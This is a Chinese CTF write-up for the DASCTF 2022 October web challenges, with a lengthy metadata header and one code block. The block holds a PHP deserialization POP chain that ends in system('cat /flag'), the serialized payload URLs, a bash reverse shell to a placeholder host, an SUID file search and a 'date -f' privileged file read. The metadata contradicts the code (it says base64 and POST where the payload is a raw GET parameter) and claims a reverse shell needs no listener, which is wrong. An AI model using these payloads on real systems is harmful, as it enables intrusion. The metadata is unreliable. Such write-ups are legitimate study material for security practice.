---
title: DASCTF 2022 十月赛 Web 部分 Writeup
contest: DASCTF
year: 2022
difficulty: easy
vuln_type: deserialize
tags:
- php
- pop-chain
- fine-show-sorry
- file-read
- suid-date
- bash-reverse
attack_chain:
- 构造 sorry → show → secret_code → sorry → fine POP 链
- fine.cmd = system
- fine.content = 'cat /flag
- serialize 后 base64 POST pop
- /file.php?m=show&filename=file.php 读源
- bash -i 反弹 shell
- find / -perm -u=s -type f
- date -f /hereisflag/flllll111aaagg
key_payload: 5 层 POP 链 + system 触发
one_liner: DASCTF 2022 十月赛 Web 入门题集，5 层 PHP 反序列化 POP + file.php 源码泄露 + SUID 提权。
lesson: PHP 反序列化 POP 链构造的关键是"找到包含可调用方法的对象作为下一个对象的属性"。
quality: medium
full_path: DASCTF2022_——十月赛_Web_部分Writeup.full.md
meta_path: DASCTF2022_——十月赛_Web_部分Writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: DASCTF 2022 十月赛 Web 部分 Writeup。DASCTF 2022 十月赛 Web 入门题集，5 层 PHP 反序列化 POP + file.php 源码泄露 + SUID 提权。。关键路径：构造 sorry → show → secret_code → sorry → fine POP 链 → fine.cmd = system → fine.content = 'cat...
category: web
subcategory: deserialization
tools_used:
- PHP
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/67573.html
reasoning_chain:
- 题目 1 给 4 个类 fine/show/sorry/secret_code + 反序列化入口 ?pop= → 触发点：PHP POP 链构造
- 动作：构造 sorry->show->secret_code->sorry->fine 五层 POP → fine.cmd=system + fine.content='cat /flag' → serialize 后 base64
- 观察：URL ?pop=O:5:"sorry":4:{...} → 反序列化触发魔术方法 → fine.__destruct 或 fine.cmd() 调 system('cat /flag')
- 假设：必须找包含可调用方法的对象作为下一个对象的属性 → 动作：sorry.hint = show → show.ctf = secret_code → secret_code.code = sorry → sorry.key = fine
- 题目 2 /file.php?m=show&filename=file.php → 触发点：源码泄露 → 假设：本地读源码 + 反弹 shell
- 动作：bash -i >& /dev/tcp/xxxx/yyyy 0>&1 → 反弹 shell → find / -perm -u=s -type f → 找 SUID 文件
- 假设：/hereisflag/flllll111aaagg 是 flag → date -f 触发文件读取 SUID 提权 → 完成
failed_attempts:
- 试图找 __wakeup 绕过直接反序列化 → 失败：必须按 POP 链触发，不能跳过中间层
- 试图 base64 不编码直接传 → 失败：题目要求 base64 后 POST
- 试图 find 找 flag 后 cat → 失败：flag 文件被 SUID date -f 限制读取，需要 date 提权
key_observations:
- POP 链构造关键是 '找到包含可调用方法的对象作为下一个对象的属性'
- fine.cmd='system' + fine.content='cat /flag' 是 PHP 反序列化命令执行经典 payload
- /file.php?m=show&filename=file.php 是任意文件读取的源码泄露漏洞
- SUID date -f /path 是 Linux 提权经典（date 可读取任意文件内容）
- bash -i >& /dev/tcp/x/y 反向 shell 比 nc 更稳（无需 nc 监听）
prerequisites:
- PHP 序列化/反序列化（serialize/unserialize/O:）
- 魔术方法（__destruct/__wakeup/__invoke）
- Linux bash 反向 shell（bash -i >& /dev/tcp）
- Linux SUID 提权（find -perm -u=s / date -f）
---
# DASCTF2022 ——十月赛 Web 部分Writeup

> 原文: https://www.ctfiot.com/67573.html
> ID: 67573


```
<?php

class fine
{
 public $cmd;
 public $content;
}

class show
{
 public $ctf;
 public $time;
}

class sorry
{
 public $name;
 public $password;
 public $hint;
 public $key;
}

class secret_code
{
 public $code;
}

$e = new fine();
$e->cmd = 'system';
$e->content = 'cat /flag';

$d = new sorry();
$d->key = $e;

$c = new secret_code();
$c->code = $d;

$b = new Show();
$b->ctf = $c;

$a = new sorry();
$a->name = '123';
$a->password = '123';
$a->hint = $b;

echo serialize($a);
http://f9eac3ed-9425-4fe7-a009-aad41f9db212.node4.buuoj.cn:81/?pop=O:5:"sorry":4:{s:4:"name";s:3:"123";s:8:"password";s:3:"123";s:4:"hint";O:4:"show":2:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";N;s:3:"key";O:4:"fine":3:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat /flag";}}}s:4:"time";N;}s:3:"key";N;}
http://f9eac3ed-9425-4fe7-a009-aad41f9db212.node4.buuoj.cn:81/?pop=O:5:"sorry":4:{s:4:"name";s:3:"123";s:8:"password";s:3:"123";s:4:"hint";O:4:"show":2:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";N;s:3:"key";O:4:"fine":3:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat /flag";}}}s:4:"time";N;}s:3:"key";N;}
http://745b93ee-b378-4803-b84e-52f9e7b78d2a.node4.buuoj.cn:81/file.php?m=show&filename=file.php
bash -i >& /dev/tcp/xxxx/yyyy 0>&1
find / -perm -u=s -type f 2>/dev/null
date -f /hereisflag/flllll111aaagg
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]